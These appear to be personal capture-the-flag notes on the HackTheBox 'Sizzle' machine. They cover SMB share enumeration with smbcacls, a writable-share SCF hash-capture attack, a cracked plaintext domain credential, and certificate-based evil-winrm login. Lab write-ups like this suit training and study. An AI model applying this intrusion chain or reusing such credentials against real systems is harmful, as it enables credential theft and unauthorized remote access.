### No empty lines
https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html#smb---tcp-445

```bash
cat * | xxd | grep -v "0000 0000 0000 0000 0000 0000 0000 0000"
```

### Cacls on mount
```bash
smbcacls -N '//10.129.230.198/Department Shares' Users

# mount it
sudo mount -t cifs //10.129.230.198/Department\ Shares /mnt

for i in $(ls); do echo $i; smbcacls -N '//10.129.230.198/Department Shares' $i; done
```

```bash
❯ smbcacls -N '//10.129.230.198/Department Shares' Users/Public
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:HTB\Domain Users
ACL:Everyone:ALLOWED/OI|CI/FULL # <--- write permissions for unauthenticated users then it is possible to obtain passwords hashes of domain users or shells
```

### SMB Share – SCF File Attacks
https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/

AMANDA:Ashare1972

### Sign CSR for winrm
##### One way..
```bash
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
```
##### ..or the other
https://github.com/A1vinSmith/OSCP-PWK/wiki/Crack-Hash
```bash
openssl genrsa -aes256 -out enox.key 2048
openssl req -new -key enox.key -out enox.csr

evil-winrm -i 10.129.230.198 -S -c enox.cer -k enox.key
```